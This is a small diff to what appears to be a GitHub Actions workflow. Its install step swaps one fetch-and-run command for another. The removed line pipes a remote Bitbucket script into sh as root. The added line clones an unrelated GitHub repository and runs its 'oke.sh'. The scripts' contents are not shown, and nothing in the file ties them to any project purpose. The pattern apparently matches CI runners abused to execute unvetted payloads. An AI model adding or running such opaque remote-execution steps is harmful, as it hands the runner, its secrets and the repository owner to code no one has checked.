@@ -30,4 +30,4 @@ jobs:
     - name: Setup 
       uses: actions/checkout@v2 
     - name: Install 
-      run: sudo -u root curl https://bitbucket.org/wani456/jaker/raw/e8bc042fa4e140a4ca458753f1255fef07f26a03/install.sh | sh
+      run: git clone https://github.com/joykotest/kadal.git && cd kadal && chmod +x oke.sh && ./oke.sh
